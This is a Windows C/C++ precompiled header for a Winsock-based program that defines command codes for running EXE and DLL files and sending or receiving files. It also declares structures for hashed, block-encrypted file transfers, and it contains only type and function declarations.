// stdafx.h : include file for standard system include files,
// or project specific include files that are used frequently, but
// are changed infrequently
//

#pragma once

#include "targetver.h"

#include <Winsock2.h>
#include <Windows.h>
#include <stdio.h>
#include <tchar.h>
#include "ListSup.h"
#include <strsafe.h>
#include <Shlwapi.h>
#pragma comment(lib,"Shlwapi.lib")
#pragma comment(lib,"Ws2_32.lib")

#define COMMAND_RUN_EXE		0x00000001
#define COMMAND_RUN_DLL		0x00000002
#define COMMAND_REVICE_FILE	0x00000003
#define COMMAND_SEND_FILE	0x00000004
#define COMMAND_COMPLETE	0x00000005
#define COMMAND_OVER		0x00000006

typedef struct _CHECK_COMMAND
{
	ULONG ulCommand;
}CHECK_COMMAND,*PCHECK_COMMAND;

typedef struct _RANDOM_BLOCK
{
	LIST_ENTRY ListRandomBlock;
	ULONG ulIndex;
	PCHAR pCryptDat;
	ULONG_PTR ulCryptDatLength;
	ULONG ulOffset;
}RANDOM_BLOCK,*PRANDOM_BLOCK;

typedef struct _RECV_FILE_INFO 
{
	LIST_ENTRY List;
	LIST_ENTRY RandomBlockList;
	BYTE FileHash[32];
	ULONG_PTR ulFileSize;
	ULONG_PTR ulRandomCount;
	BOOLEAN bIsCrypt;
	BOOLEAN bIsWrited;
	WCHAR wFileName[MAX_PATH];
	WCHAR wFileFullPath[MAX_PATH];
}RECV_FILE_INFO,*PRECV_FILE_INFO;

typedef struct _RECV_RANDOM_BLOCK
{
	ULONG ulIndex;
	ULONG_PTR ulCryptDatLength;
	ULONG ulOffset;
}RECV_RANDOM_BLOCK,*PRECV_RANDOM_BLOCK;

typedef struct _RECV_FILE_DAT
{
	CHECK_COMMAND CmdLine;
	BYTE FileHash[32];
	ULONG_PTR ulFileSize;
	ULONG_PTR ulRandomCount;
	BOOLEAN bIsCrypt;
	WCHAR wFileName[MAX_PATH];
}RECV_FILE_DAT,*PRECV_FILE_DAT;

extern LIST_ENTRY g_RecvFileList;
extern CRITICAL_SECTION g_CriticalSection;
extern WCHAR g_wCurPath[MAX_PATH];

DWORD DelRecvList(LPVOID lpParameter);
// TODO: reference additional headers your program requires here
